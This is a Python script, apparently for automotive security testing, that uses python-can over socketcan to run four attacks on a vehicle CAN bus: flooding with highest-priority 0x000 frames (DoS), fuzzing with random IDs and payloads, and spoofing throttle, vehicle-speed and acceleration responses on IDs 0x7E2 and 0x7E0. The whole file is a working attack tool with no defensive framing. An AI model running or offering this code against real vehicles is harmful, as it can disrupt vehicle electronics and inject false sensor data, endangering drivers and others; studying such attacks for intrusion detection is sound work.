import time
import can
import random
import sys

bus = can.interface.Bus(interface='socketcan', channel='can0', bitrate=500000)

def send_message(arb_id=0x000, bytes=[0, 0, 0, 0, 0, 0, 0, 0]):
    """Sends a single message."""
    with bus:
        msg = can.Message(
            arbitration_id=arb_id, data=bytes
        )
        try:
            bus.send(msg)
            print(f"Message {hex(msg.arbitration_id)} {msg.data.hex()} sent on {bus.channel_info}")
        except can.CanError:
            print("Message NOT sent")

def generate_random_bytes():
    bytes = []
    for i in range(8):
        bytes.append(random.randrange(0, 255))
    return bytes

def dos_attack(interval=0.0002, duration=20):
    """Sends a strem of high-priority message."""
    print("Starting DoS Attack")
    for i in range(int(duration / interval)):
        msg = can.Message(arbitration_id=0x000, data=[0, 0, 0, 0, 0, 0, 0, 0], is_extended_id=False)
        task = bus.send_periodic(msg, interval)
        assert isinstance(task, can.CyclicSendTaskABC)
        time.sleep(interval)
        task.stop()
    print("Stopped DoS cyclic send")

def fuzzy_attack(interval=0.003, duration=20):
    """Sends stream of random id and payload messages."""
    print("Starting Fuzzy Attack")
    for i in range(int(duration / interval)):
        msg = can.Message(arbitration_id=random.randrange(0, 4095), data=generate_random_bytes(), is_extended_id=False)
        task = bus.send_periodic(msg, interval)
        assert isinstance(task, can.CyclicSendTaskABC)
        time.sleep(interval)
        task.stop()
    print("Stopped Fuzzy attack")

def throt_vehicspeed_spoofing(interval=0.001, duration=20):
    """Sends falsified throttle and vehicle speed message."""
    print("Starting Throttle and Vehicle Speed Spoofing")
    for i in range(int(duration / interval)):
        msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 13, 00, 00, 00, 00, 00], is_extended_id=False)
        task = bus.send_periodic(msg, interval)
        assert isinstance(task, can.CyclicSendTaskABC)
        time.sleep(interval)
        task.stop()
    print("Stopped Throttle and Vehicle Speed Spoofing")

def acelleration_spoofing(interval=0.05, duration=20):
    """Sends falsified acelleration response message."""
    print("Starting Acceleration Spoofing")
    for i in range(int(duration / interval)):
        msg = can.Message(arbitration_id=0x7E0, data=[00, 65, 73, 00, 00, 00, 00, 00], is_extended_id=False)
        task = bus.send_periodic(msg, interval)
        assert isinstance(task, can.CyclicSendTaskABC)
        time.sleep(interval)
        task.stop()
    print("Stopped Acceleration Spoofing")

if __name__ == "__main__":
    command = sys.argv[1]
    duration = int(sys.argv[2])

    if (command == "dos"):
        dos_attack(duration=duration)
    elif (command == "fuzzy"):
        fuzzy_attack(duration=duration)
    elif (command == "throt"):
        throt_vehicspeed_spoofing(duration=duration)
    elif (command == "accel"):
        acelleration_spoofing(duration=duration)

    bus.shutdown()
